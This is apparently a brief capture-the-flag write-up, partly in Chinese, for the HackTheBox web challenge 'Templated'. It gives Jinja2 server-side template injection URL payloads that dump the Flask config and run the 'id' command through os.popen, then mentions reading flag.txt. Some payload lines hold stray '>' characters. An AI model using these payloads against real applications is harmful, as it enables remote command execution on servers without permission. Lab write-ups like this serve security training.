---
title: Templated - HACKTHEBOX Challeges Web
tags: ctf
---

flask/jinja2 SSTI模板注入

```http
http://IP:PORT/{{config>}}
http://IP:PORT/{{request.application>.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

执行`id`的poc

```http

http://IP:PORT/{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

```

然后就是查看目录，查看flag.txt内容
